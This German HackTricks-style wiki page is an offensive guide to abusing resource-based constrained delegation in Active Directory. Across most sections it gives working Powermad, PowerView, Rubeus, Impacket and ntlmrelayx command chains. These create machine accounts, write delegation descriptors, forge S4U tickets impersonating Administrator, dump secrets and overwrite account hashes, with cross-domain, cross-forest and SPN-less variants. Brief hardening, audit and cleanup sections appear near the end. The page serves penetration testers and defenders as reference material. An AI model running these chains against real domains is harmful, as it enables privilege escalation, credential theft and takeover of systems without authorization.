# Ressourcenbasierte eingeschränkte Delegierung

{{#include ../../banners/hacktricks-training.md}}


## Grundlagen der ressourcenbasierten eingeschränkten Delegierung

Die ressourcenbasierte eingeschränkte Delegierung (RBCD) ähnelt der [eingeschränkten Delegierung](constrained-delegation.md), aber die Vertrauensrichtung ist umgekehrt. Bei der herkömmlichen eingeschränkten Delegierung wird festgehalten, an welche Dienste ein Principal delegieren darf; bei RBCD wird auf der **Zielressource** festgehalten, welche Principals sich gegenüber dieser Ressource als Benutzer ausgeben dürfen.<sup>[[12]](#references)</sup>

Das Attribut _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ des Zielobjekts enthält einen Sicherheitsdeskriptor, der die Principals angibt, die gegenüber dieser Ressource im Namen anderer Identitäten handeln dürfen.

Ein weiterer wichtiger Unterschied ist, dass ein Principal mit ausreichenden **Schreibberechtigungen für ein Computerkonto** (`GenericAll`, `GenericWrite`, `WriteDacl`, `WriteProperty` und ähnliche Rechte) möglicherweise _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann. Für die Konfiguration einer herkömmlichen eingeschränkten Delegierung sind normalerweise höhere administrative Berechtigungen erforderlich.<sup>[[1]](#references)</sup>

Genauer gesagt erfordert das Ändern der Einstellungen für die klassische eingeschränkte Delegierung normalerweise `SeEnableDelegationPrivilege` auf einem Domain Controller – ein Recht, das üblicherweise hoch privilegierte Administratoren besitzen. Bei RBCD wird die Entscheidung auf den Sicherheitsdeskriptor des Zielobjekts verlagert. Daher kann Schreibzugriff auf die entsprechende Eigenschaft des Computerobjekts genügen, ohne dass der Benutzer dieses Recht benötigt.<sup>[[1]](#references)[[2]](#references)</sup>

### Neue Konzepte

Das Flag **`TrustedToAuthForDelegation`** in `userAccountControl` wird oft als Voraussetzung für **S4U2Self** beschrieben, doch das ist unvollständig.\
Ein Service-Principal mit einem SPN kann S4U2Self auch ohne dieses Flag anfordern. Mit `TrustedToAuthForDelegation` ist das zurückgegebene Service-Ticket **forwardable**; ohne das Flag ist das Ticket normalerweise **non-forwardable**.<sup>[[5]](#references)</sup>

Die herkömmliche eingeschränkte Delegierung weist im S4U2Proxy-Schritt ein **non-forwardable TGS** zurück. RBCD kann dieses S4U2Self-Ticket akzeptieren, wenn der Sicherheitsdeskriptor des Ziels den anfragenden Dienst autorisiert.<sup>[[1]](#references)[[2]](#references)[[16]](#references)</sup>

### Angriffsaufbau

> Wenn du **schreibäquivalente Berechtigungen** für ein **Computerkonto** hast, kannst du möglicherweise privilegierten Zugriff auf diesen Computer erlangen.

Angenommen, der Angreifer hat bereits **schreibäquivalente Berechtigungen für das Computerobjekt des Opfers**.

1. Der Angreifer **kompromittiert** ein Konto mit einem **SPN** oder **erstellt eines** („Service A“). Standardmäßig kann ein authentifizierter Domain-Benutzer bis zu 10 Computerobjekte erstellen, gesteuert durch **_MachineAccountQuota_**; ein Computerobjekt stellt automatisch verwendbare SPNs bereit.
2. Der Angreifer **missbraucht seine WRITE-Berechtigung** für den Computer des Opfers (ServiceB), um **ressourcenbasierte eingeschränkte Delegierung so zu konfigurieren, dass ServiceA sich gegenüber diesem Computer des Opfers (ServiceB) als beliebiger Benutzer ausgeben darf**.
3. Der Angreifer verwendet Rubeus, um von Service A zu Service B einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) für einen Benutzer **mit privilegiertem Zugriff auf Service B** durchzuführen.
   1. S4U2Self (vom kompromittierten oder erstellten SPN-Konto): ein **TGS anfordern, das Administrator gegenüber Service A repräsentiert** (non-forwardable).
   2. S4U2Proxy: dieses **non-forwardable TGS** verwenden, um ein Service-Ticket anzufordern, das **Administrator** gegenüber dem **Host des Opfers** repräsentiert.
   3. Das non-forwardable Ticket kann in diesem RBCD-Ablauf trotzdem funktionieren, weil Service A im Sicherheitsdeskriptor der Zielressource autorisiert ist.
4. Der Angreifer kann **pass-the-ticket** verwenden und sich als Benutzer **ausgeben**, um **Zugriff auf ServiceB des Opfers** zu erlangen.<sup>[[1]](#references)</sup>

`MachineAccountQuota=0` unterbindet den standardmäßigen Weg zur Erstellung von Computerkonten, hebt aber weder Schreibrechte für das Zielcomputerobjekt noch die Kontrolle über ein bestehendes Konto auf. Ein kontrollierter gewöhnlicher Benutzer ohne SPN kann manchmal über die [SPN-less U2U method](#spn-less-cross-domain--cross-forest-rbcd) als delegierender Principal verwendet werden, auch innerhalb einer Domain. Dieser Weg setzt weiterhin ein wirksames RBCD-Schreibrecht, die Kontrolle über die Zugangsdaten des delegierenden Benutzers, eine delegierbare Identität, als die man sich ausgibt, kompatibles Kerberos-Verschlüsselungsverhalten und eine Änderung des NT-Hashes voraus, die das Konto beeinträchtigt. Behandle dies als separate Voraussetzungen; ein leeres RBCD-Attribut oder ein Quota von null beweist für sich genommen weder Erfolg noch Sicherheit.

Ein bestehender RBCD-Deskriptor kann auch eine **Gruppe** statt direkt den delegierenden Computer enthalten. Wenn du ein Computerkonto mit SPN kontrollierst und es zu dieser Gruppe hinzufügen kannst, kann die neue Mitgliedschaft den Delegierungspfad ermöglichen, ohne das RBCD-Attribut des Zielcomputers zu ändern. Prüfe die effektive ACL für das Ändern der Gruppenmitgliedschaft (einschließlich deny ACEs), verschachtelte Mitgliedschaften und die Aktualisierung des Tokens, die Trustee-SID im Deskriptor, die Delegierungsbeschränkungen des impersonierten Kontos und den SPN des Zieldienstes, bevor du davon ausgehst, dass der Pfad funktioniert.

Um den _**MachineAccountQuota**_ der Domain zu prüfen, kannst du Folgendes verwenden:

```bash
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```

## Angriff

### Erstellen eines Computerobjekts

Mit **[powermad](https://github.com/Kevin-Robertson/Powermad):** kannst du ein Computerobjekt in der Domäne erstellen.<sup>[[3]](#references)[[4]](#references)</sup>

```bash
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```

### Konfigurieren der ressourcenbasierten eingeschränkten Delegierung

**Mit dem Active Directory PowerShell-Modul**<sup>[[4]](#references)</sup>

```bash
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assign delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```

**Verwendung von powerview**<sup>[[3]](#references)</sup>

```bash
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```

### Durchführen eines vollständigen S4U-Angriffs (Windows/Rubeus)

Zunächst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt. Daher benötigen wir den Hash dieses Passworts:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```

Dadurch werden die RC4- und AES-Hashes für dieses Konto ausgegeben.\
Nun kann der Angriff durchgeführt werden:<sup>[[3]](#references)[[4]](#references)</sup>

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```

Du kannst weitere Tickets für weitere Dienste generieren, indem du mit dem `/altservice`-Parameter von Rubeus nur einmal anfragst:

```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```

> [!CAUTION]
> Benutzer können als **„Konto ist sensibel und kann nicht delegiert werden“** markiert werden. Wenn diese Markierung aktiviert ist, kann das Konto nicht über diesen Delegierungsablauf imitiert werden. BloodHound zeigt diese Eigenschaft bei der Analyse an.

### Linux-Tools: RBCD vollständig mit Impacket (2024+)

Wenn du Linux verwendest, kannst du die vollständige RBCD-Kette mit den offiziellen Impacket-Tools durchführen:<sup>[[6]](#references)[[7]](#references)</sup>

```bash
# 1) Create attacker-controlled machine account (respects MachineAccountQuota)
impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'P@ss123' -dc-ip 192.168.56.10 'domain.local/jdoe:Summer2025!'

# 2) Grant RBCD on the target computer to FAKE01$
#    -action write appends/sets the security descriptor for msDS-AllowedToActOnBehalfOfOtherIdentity
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -dc-ip 192.168.56.10 -action write 'domain.local/jdoe:Summer2025!'

# 3) Request an impersonation ticket (S4U2Self+S4U2Proxy) for a privileged user against the victim service
impacket-getST -spn cifs/victim.domain.local -impersonate Administrator -dc-ip 192.168.56.10 'domain.local/FAKE01$:P@ss123'

# 4) Use the ticket (ccache) against the target service
export KRB5CCNAME=$(pwd)/Administrator.ccache
# Example: dump local secrets via Kerberos (no NTLM)
impacket-secretsdump -k -no-pass Administrator@victim.domain.local
```

Notes
- Wenn LDAP signing/LDAPS erzwungen wird, `impacket-rbcd -use-ldaps ...` verwenden.
- AES-Schlüssel bevorzugen; viele moderne Domains schränken RC4 ein. Impacket und Rubeus unterstützen beide AES-only-Abläufe.
- Impacket kann für manche Tools den `sname` („AnySPN“) umschreiben, aber den korrekten SPN möglichst immer ermitteln (z. B. CIFS/LDAP/HTTP/HOST/MSSQLSvc).

### Reflective RBCD für einen SPN-losen Kerberos-only-Delegator

Ein kompromittierter Benutzer mit **`msDS-AllowedToDelegateTo`, aber ohne SPN oder `TrustedToAuthForDelegation`** kann mit gewöhnlichem S4U2Self nicht das forwardable Evidence-Ticket erzeugen, das für [Kerberos-only constrained delegation](constrained-delegation.md#protocol-transition-vs-kerberos-only-constrained-delegation) benötigt wird.<sup>[[1]](#references)[[18]](#references)</sup> Wenn der Benutzer RBCD auf sein **eigenes** AD-Objekt schreiben kann, kann ein vom Angreifer kontrolliertes Konto mit SPN zuerst *zum Benutzer* delegieren.<sup>[[1]](#references)[[18]](#references)</sup> Dieser RBCD-Hop liefert ein forwardable Ticket für den impersonierten Benutzer an das SPN-lose Konto. Dieses dient dann als Evidence für ein zweites S4U2Proxy zu einem SPN auf der klassischen Delegation-Allowlist des kompromittierten Kontos.<sup>[[18]](#references)[[19]](#references)</sup>

Für den ersten Hop ohne SPN muss die S4U2Proxy-Anfrage des Hilfskontos **U2U** verwenden: `enc-tkt-in-skey` veranlasst den KDC, das Ticket mit dem TGT-Session-Key des Delegators zu verschlüsseln, statt nach einem SPN-Schlüssel zu suchen.<sup>[[18]](#references)[[19]](#references)</sup> Der KDC benötigt außerdem das RBCD-Bit in `PA-PAC-OPTIONS`, das TGT des Delegators und das S4U2Self-Evidence-Ticket.<sup>[[18]](#references)[[20]](#references)</sup> Der Fork des Autors von Impackets `getST.py` fügt für diese Anfrage `-nospn` und `-tgt` hinzu. Die Unterstützung für `-nospn`/`-tgt` ist in Upstream-Impacket PR #2324 enthalten. Verwende daher den verlinkten Fork, statt davon auszugehen, dass das unveränderte `getST.py` diesen Schritt unterstützt.<sup>[[18]](#references)[[20]](#references)</sup>

Dieses Beispiel setzt voraus, dass `svc_web` kompromittiert ist, sein eigenes RBCD-Attribut schreiben darf und zur Delegierung an `host/dc01.corp.local` berechtigt ist. Außerdem wird vorausgesetzt, dass ein Hilfskonto mit SPN erstellt werden kann, RC4 erlaubt ist und der ausgewählte `Administrator` delegierbar ist. Fordere mit dem NT-Hash des kompromittierten Kontos ein **RC4-TGT** an. Führe das **erste** `getST.py` aus dem Fork des Autors aus, prüfe die Ausgabe von `describeTicket.py` und setze unten dessen **RC4-TGT-Session-Key** ein. Das letzte `getST.py` kann aus dem unveränderten Impacket stammen. Fordere das TGT **vor** der Änderung des NT-Hashes an. Diese Änderung legt das Dienstkonto lahm, bis sein Passwort zurückgesetzt wird.<sup>[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

```bash
pypykatz crypto nt 'OldPass!'
getTGT.py -hashes ':<CURRENT_NT_HASH>' 'corp.local/svc_web' -dc-ip 10.0.0.10
describeTicket.py svc_web.ccache
addcomputer.py -computer-name 'HELPER$' -computer-pass 'HelperPass!' -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
rbcd.py -delegate-from 'HELPER$' -delegate-to svc_web -action write -dc-ip 10.0.0.10 'corp.local/svc_web:OldPass!'
changepasswd.py 'corp.local/svc_web:OldPass!@10.0.0.10' -newhashes ':<RC4_TGT_SESSION_KEY>'
python3 ./getST.py -u2u -impersonate Administrator -nospn svc_web -tgt svc_web.ccache -dc-ip 10.0.0.10 'corp.local/HELPER$:HelperPass!'
KRB5CCNAME=svc_web.ccache impacket-getST -impersonate Administrator -spn host/dc01.corp.local -additional-ticket 'Administrator@svc_web@CORP.LOCAL.ccache' -k -no-pass -dc-ip 10.0.0.10 'corp.local/svc_web'
```

Im Gegensatz zur [SPN-less-RBCD-Route weiter unten](#spn-less-cross-domain--cross-forest-rbcd) verwendet diese Chain das SPN-less-Konto als **RBCD-Ziel und anschließend als klassischen KCD-Delegator**. Dafür wird weiterhin ein weiteres kontrolliertes Konto mit einem SPN benötigt. Wenn `MachineAccountQuota=0` gilt, kann ein bereits kontrolliertes SPN-Konto den neuen Computer ersetzen; eine Quota von null allein verhindert diesen Pfad also nicht.<sup>[[18]](#references)[[19]](#references)</sup>

## Domain- und forestübergreifendes RBCD

Wenn der **delegierende Prinzipal**, den du kontrollierst, in einer **anderen Domain** (oder sogar in einem **anderen Forest**) als der **Ressourcencomputer** liegt, handelt es sich weiterhin um **RBCD**. Der Ticket-Ablauf entspricht jedoch nicht mehr dem üblichen `S4U2Self -> S4U2Proxy` innerhalb einer einzelnen Domain.

### Domainübergreifendes RBCD: den fremden Prinzipal per SID konfigurieren

Wenn du `msDS-AllowedToActOnBehalfOfOtherIdentity` aus einer **anderen Domain** setzt, kann es sein, dass die fremde Maschine/der fremde Benutzer im LDAP der Zieldomain **nicht über den Namen aufgelöst werden kann**. Konfiguriere in diesem Fall den Delegierungseintrag stattdessen mit der **SID** des fremden Prinzipals und nicht mit seinem sAMAccountName/UPN.

Das ist besonders relevant, wenn du NTLM mit `ntlmrelayx.py` an LDAP weiterleitest:<sup>[[9]](#references)</sup>

```bash
sudo ntlmrelayx.py -smb2support -t ldap://192.168.90.217 \
  --no-dump --no-da --no-validate-privs \
  --delegate-access \
  --escalate-user S-1-5-21-3104832133-133926542-3798009529-1106 \
  --sid
```

Hinweise:
- `--sid` weist `ntlmrelayx.py` an, `--escalate-user` als SID zu behandeln. Das ist erforderlich, wenn das delegierende Konto einer fremden Domäne angehört.
- Auch wenn das Tool `User not found in LDAP` ausgibt, kann das Schreiben der Delegation trotzdem erfolgreich sein, da der Security Descriptor die fremde SID direkt speichert.

### Domänenübergreifendes RBCD: Cross-Realm-S4U-Ablauf

Sobald sich der fremde Principal in `msDS-AllowedToActOnBehalfOfOtherIdentity` befindet, funktioniert der domänenübergreifende Ablauf wie folgt:<sup>[[9]](#references)[[13]](#references)</sup>

1. Einen **TGT** für den delegierenden Principal von dessen eigener Domäne abrufen.
2. Einen **Referral-TGT** für `krbtgt/<target-domain>` anfordern.
3. Auf dem DC der Zieldomäne einen **Cross-Realm-S4U2Self-Referral** für den zu imitierenden Benutzer anfordern.
4. Das eigentliche **S4U2Self**-Ticket für diesen Benutzer zurück in der Delegator-Domäne anfordern.
5. **S4U2Proxy** in der Delegator-Domäne ausführen, um ein Referral-Ticket für die Zieldomäne zu erhalten.
6. Das abschließende **S4U2Proxy** auf dem DC der Zieldomäne ausführen, um das Service-Ticket für `cifs/host.target`, `host/host.target` usw. zu erhalten.

Deshalb scheitern Standard-Linux-Tools bei domänenübergreifendem RBCD oft:<sup>[[9]](#references)</sup>
- Das **Realm** der Anfrage muss sich möglicherweise vom Realm des in der `TGS-REQ` verwendeten TGT unterscheiden.
- Die Abfolge erfordert **unabhängige S4U2Proxy-Schritte** und nicht nur `S4U2Self` oder `S4U2Self`, unmittelbar gefolgt von einem einzelnen `S4U2Proxy`.

### Domänenübergreifendes RBCD unter Linux

Synacktiv veröffentlichte eine Impacket-Implementierung von `getST.py`, die den Cross-Realm-Ablauf unter Linux nachbildet, indem sie die beiden KDCs explizit verarbeitet:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py dev.asgard.local/rbcd_test\$:R[...]5 -k \
  -dc-ip 192.168.90.131 \
  -targetdc 192.168.90.217 \
  -targetdomain asgard.local \
  -impersonate thor_adm \
  -spn cifs/workstation.asgard.local

KRB5CCNAME=thor_adm@cifs_workstation.asgard.local@ASGARD.LOCAL.ccache \
  ./smbclient.py "asgard.local/thor_adm@workstation.asgard.local" \
  -k -no-pass -dc-ip 192.168.90.217
```

Operativ sind die neuen Argumente:
- `-dc-ip`: DC der **delegierenden** Domäne
- `-targetdomain`: Domäne des **Ressourcencomputers**
- `-targetdc`: DC der **Ressourcen**domäne

### Einschränkungen bei forestübergreifendem RBCD

Forestübergreifendes RBCD hat eine wichtige Einschränkung: **Der impersonierte Benutzer muss zum selben Forest gehören wie der delegierende Principal**. Mit anderen Worten: Wenn sich dein kontrolliertes Maschinenkonto in `valhalla.local` befindet und die Zielressource in `asgard.local`, kannst du über RBCD im Allgemeinen **keine beliebigen `asgard.local`-Benutzer gegenüber dieser Ressource impersonieren**.<sup>[[9]](#references)</sup>

Es ist weiterhin ausnutzbar, wenn:
- der Benutzer aus dem **delegierenden Forest** auf dem Ressourcenhost im anderen Forest **lokaler Administrator** (oder anderweitig privilegiert) ist
- ein Trust den erforderlichen Authentifizierungspfad ermöglicht und die fremde SID im Sicherheitsdeskriptor des Zielcomputers akzeptiert wird

### Protokollbesonderheiten bei forestübergreifendem RBCD

Forestübergreifendes RBCD ist nicht einfach „domänenübergreifend plus ein Trust“. Der beobachtete Ablauf umfasst zwei Besonderheiten, die gängige Tools bisher häufig übersehen:<sup>[[9]](#references)</sup>

1. Eine zusätzliche **S4U2Proxy**-Anfrage, die **`PA-PAC-OPTIONS=branch-aware`** setzt
2. Ein finales Service-Ticket, das möglicherweise mit **RC4** zurückgegeben wird, selbst wenn andere Etypes angefordert wurden

Der praktische Ablauf ist:

1. Ein TGT für den delegierenden Principal in Forest A abrufen.
2. **S4U2Self** für den impersonierten Benutzer in Forest A anfordern.
3. **S4U2Proxy** in Forest A anfordern, um ein Referral-TGT für Forest B zu erhalten.
4. Eine zweite **S4U2Proxy**-Anfrage in Forest A **ohne** das S4U2Self-Ticket als zusätzliches Ticket senden, aber mit aktiviertem `branch-aware`, um ein weiteres Referral-TGT für Forest B zu erhalten.
5. Optional ein normales Service-Ticket in Forest B für den delegierenden Principal anfordern (dieses Ticket ist für den finalen Abuse nicht erforderlich).
6. Die Referral-Tickets aus den Schritten 3 und 4 verwenden, um das finale **S4U2Proxy**-Ticket in Forest B für den impersonierten Forest-A-Benutzer zum Ziel-SPN anzufordern.

### Forestübergreifendes RBCD unter Linux

Derselbe Synacktiv-Impacket-Branch fügt für diese Logik einen `-forest`-Schalter hinzu:<sup>[[9]](#references)[[11]](#references)</sup>

```bash
python3 ./getST.py -spn 'cifs/workstation.asgard.local' \
  -impersonate 'v_thor' \
  -dc-ip VALHALLA.local \
  valhalla.local/'desktop$' \
  -targetdc ASGARD.local \
  -targetdomain asgard.local \
  -aesKey 4[...]f \
  -forest
```

### Rekursives Multi-Domain-RBCD (3+ Domains)

In **Multi-Domain-Forests** können sowohl **S4U2Self** als auch **S4U2Proxy** **rekursiv** sein, statt nach einer Referral aufzuhören:

- **Rekursives S4U2Self**: Das erste `S4U2Self` wird an die **Domain des impersonierten Users** gesendet. Die Zwischenstationen über Parent/Child-Domains werden mit normalen `TGS-REQ`-Referrals für `krbtgt/<REALM>` durchlaufen, und das **letzte `S4U2Self`** wird in der eigenen Domain des **delegierenden Principals** gesendet.
- Das bedeutet, dass **allein ein TGT** für ein Maschinenkonto ausreichen kann, um einen **Admin aus einer anderen Domain im selben Forest** zu impersonieren und `cifs/host`, `host/host`, `wsman/host` usw. anzufordern.
- **Rekursives S4U2Proxy** folgt der Trust-Kette auf dieselbe Weise: Zwischenstationen verwenden das vorherige Ticket erneut als TGT und fordern dabei die nächste `krbtgt/<REALM>`-Referral an. Nur der letzte Hop gibt das finale Service-Ticket zurück.<sup>[[10]](#references)</sup>

Ein praktisches Beispiel innerhalb desselben Forests ist:

```bash
KRB5CCNAME=MIN-FRPERSO-01\$.ccache getST.py 'minus.sub.frperso.local/MIN-FRPERSO-01$' -k -no-pass \
  -impersonate Administrator@frperso.local -self \
  -altservice cifs/min-frperso-01.minus.sub.frperso.local

KRB5CCNAME=Administrator@frperso.local@cifs_min-frperso-01.minus.sub.frperso.local@MINUS.SUB.FRPERSO.LOCAL.ccache \
  smbclient.py frperso.local/Administrator@min-frperso-01.minus.sub.frperso.local -k -no-pass
```

### SPN-less cross-domain / cross-forest RBCD

Wenn der **delegierende Principal ein Benutzer ohne SPN ist**, schlägt der letzte rekursive `S4U2Self` mit **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** fehl. Die Ausweichlösung besteht darin, **nur den letzten Schritt als `S4U2Self+U2U` erneut auszuführen**.<sup>[[10]](#references)</sup>

Kurzfassung der Abuse-Kette:

1. Mit dem **NT-Hash** authentifizieren, damit der KDC **RC4-HMAC (etype 23)** bevorzugt.
2. Zuerst **`-self -u2u`** anfordern und dieses Ticket getrennt vom späteren Proxy-Schritt aufbewahren.
3. Den **TGT-Sitzungsschlüssel** mit `describeTicket.py` extrahieren.
4. Den **NT-Hash** des Benutzers mit `changepasswd.py -newhashes <session_key>` durch diesen **Sitzungsschlüssel** ersetzen.
5. Das `S4U2Self+U2U`-Ticket bei einer separaten **`-proxy`**-Anfrage als **`-additional-ticket`** wiederverwenden.

```bash
getST.py sub.frperso.local/Administrator -hashes ':<nthash>' \
  -impersonate Administrator@frperso.local -self -u2u
describeTicket.py Administrator.ccache
changepasswd.py sub.frperso.local/Administrator@sub-frperso-01.sub.frperso.local \
  -hashes ':<nthash>' -newhashes <tgt_session_key>
KRB5CCNAME=Administrator.ccache getST.py sub.frperso.local/Administrator -k -no-pass \
  -impersonate Administrator@frperso.local -proxy -proxydomain frpublic.local \
  -spn cifs/frpublic-01.frpublic.local -additional-ticket '<u2u_ticket.ccache>'
```

Betriebliche Hinweise:

- Wenn der **erste vertrauenswürdige Hop bereits eine andere Forest ist**, sollte der **branch-aware** Algorithmus (`getST.py ... -forest`) bevorzugt werden, um das native Verhalten von Windows nachzubilden. Wenn die fremde Forest erst **später** in der Kette erreicht wird, kann der nicht branch-aware rekursive Ablauf weiterhin funktionieren.<sup>[[9]](#references)</sup>
- Auf aktuellen **Windows Server 2022/2025**-DCs kann erzwungenes RC4 aufgrund der RC4-Abkündigung mit **`KDC_ERR_ETYPE_NOSUPP`** fehlschlagen. Dadurch kann **SPN-less RBCD unmöglich** sein, obwohl klassisches SPN-basiertes RBCD mit AES weiterhin funktioniert.<sup>[[15]](#references)</sup>
- Führe **`S4U2Self+U2U` aus, bevor du den Hash/das Passwort des Benutzers änderst**: `SamrChangePasswordUser` berechnet die Kerberos-AES-Schlüssel des Kontos **nicht** neu. Eine vorherige Passwortänderung kann daher spätere Ticket-Anfragen verhindern.<sup>[[14]](#references)</sup>
- Das impersonierte Konto muss weiterhin **delegierbar** sein: **Protected Users** und Konten mit **`NOT_DELEGATED`** / **„Account is sensitive and cannot be delegated“** unterbrechen die Kette.

## Hinweise zur Erkennung / Härtung

- RBCD-Pfade über Domains/Forests hinweg werden weiterhin meist durch **ACL abuse** oder **relay-to-LDAP** eingerichtet. Erzwinge auf DCs **LDAP signing** und **LDAP channel binding**, um gängige Einrichtungspfade zu unterbinden.
- Überprüfe, wer `msDS-AllowedToActOnBehalfOfOtherIdentity` für Computerobjekte schreiben kann, und löse die gespeicherten SIDs auf, einschließlich **foreign security principals**.
- Überprüfe in Umgebungen mit vielen Trusts **Selective Authentication**, **SID filtering** und ob Benutzer aus einer fremden Forest über **local admin**-Rechte auf Ressourcenhosts verfügen.

### Zugriff

Die letzte Befehlszeile führt den **vollständigen S4U-Angriff aus und injiziert den TGS** von Administrator zum Zielhost in den **Arbeitsspeicher**.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst von Administrator angefordert, sodass du auf **C$** zugreifen kannst:

```bash
ls \\victim.domain.local\C$
```

### Verschiedene Service-Tickets missbrauchen

Erfahre mehr über die [**hier verfügbaren Service-Tickets**](silver-ticket.md#available-services).

## Aufzählung, Audit und Bereinigung

### Computer mit konfiguriertem RBCD auflisten

PowerShell (Dekodierung der SD zum Auflösen der SIDs):

```powershell
# List all computers with msDS-AllowedToActOnBehalfOfOtherIdentity set and resolve principals
Import-Module ActiveDirectory
Get-ADComputer -Filter * -Properties msDS-AllowedToActOnBehalfOfOtherIdentity |
  Where-Object { $_."msDS-AllowedToActOnBehalfOfOtherIdentity" } |
  ForEach-Object {
    $raw = $_."msDS-AllowedToActOnBehalfOfOtherIdentity"
    $sd  = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $raw, 0
    $sd.DiscretionaryAcl | ForEach-Object {
      $sid  = $_.SecurityIdentifier
      try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $name = $sid.Value }
      [PSCustomObject]@{ Computer=$_.ObjectDN; Principal=$name; SID=$sid.Value; Rights=$_.AccessMask }
    }
  }
```

Impacket (auslesen oder leeren mit einem Befehl):

```bash
# Read who can delegate to VICTIM
impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
```

### Bereinigung / Zurücksetzen von RBCD

- PowerShell (Attribut löschen):

```powershell
Set-ADComputer $targetComputer -Clear 'msDS-AllowedToActOnBehalfOfOtherIdentity'
# Or using the friendly property
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount $null
```

- Impacket:

```bash
# Remove a specific principal from the SD
impacket-rbcd -delegate-to 'VICTIM$' -delegate-from 'FAKE01$' -action remove 'domain.local/jdoe:Summer2025!'
# Or flush the whole list
impacket-rbcd -delegate-to 'VICTIM$' -action flush 'domain.local/jdoe:Summer2025!'
```

## Kerberos-Fehler

- **`KDC_ERR_ETYPE_NOTSUPP`**: Das bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und du nur den RC4-Hash angibst. Gib Rubeus mindestens den AES256-Hash mit (oder gib einfach die RC4-, AES128- und AES256-Hashes an). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
- **`KDC_ERR_S_PRINCIPAL_UNKNOWN`** bei `-self` für einen normalen Benutzer: Der delegierende Principal hat wahrscheinlich **keinen SPN**. Versuche es beim **letzten Hop** erneut mit **`S4U2Self+U2U`** statt mit einem regulären `S4U2Self`.<sup>[[10]](#references)</sup>
- **`KDC_ERR_ETYPE_NOSUPP`** bei **SPN-less RBCD**: Neuere DCs können den erzwungenen **RC4-HMAC**-Pfad ablehnen, der für den Trick mit `S4U2Self+U2U` und Session-Key-Substitution erforderlich ist. Versuche stattdessen einen klassischen **SPN-backed** RBCD-Pfad mit AES.<sup>[[10]](#references)[[15]](#references)</sup>
- **`KRB_AP_ERR_SKEW`**: Das bedeutet, dass die Uhrzeit des aktuellen Computers von der des DC abweicht und Kerberos deshalb nicht richtig funktioniert.
- **`preauth_failed`**: Das bedeutet, dass der angegebene Benutzername und die Hashes für die Anmeldung nicht funktionieren. Vielleicht hast du beim Generieren der Hashes vergessen, das `$` in den Benutzernamen aufzunehmen (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
- **`KDC_ERR_BADOPTION`** bei S4U2Proxy: Prüfe die Delegationseinschränkungen des impersonierten Kontos, das Forwardable-Flag des Evidence-Tickets und ob klassisches KCD oder der RBCD-Deskriptor des Ziels diesen Hop autorisiert. Dies ist ein **KDC-Delegation-Policy-Fehler** und kein Test dafür, ob der Zieldienst läuft oder ob der Benutzer Zugriff auf Anwendungsebene hat. Ein nicht registrierter Ziel-SPN führt normalerweise stattdessen zu **`KDC_ERR_S_PRINCIPAL_UNKNOWN`**.<sup>[[21]](#references)[[22]](#references)</sup>

## Hinweise, Relays und Alternativen

- Du kannst die RBCD-SD auch über AD Web Services (ADWS) schreiben, wenn LDAP gefiltert wird. Siehe:


{{#ref}}
adws-enumeration.md
{{#endref}}

- Kerberos-Relay-Ketten enden häufig mit RBCD, um in einem Schritt lokalen SYSTEM-Zugriff zu erhalten. Praktische End-to-End-Beispiele findest du hier:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

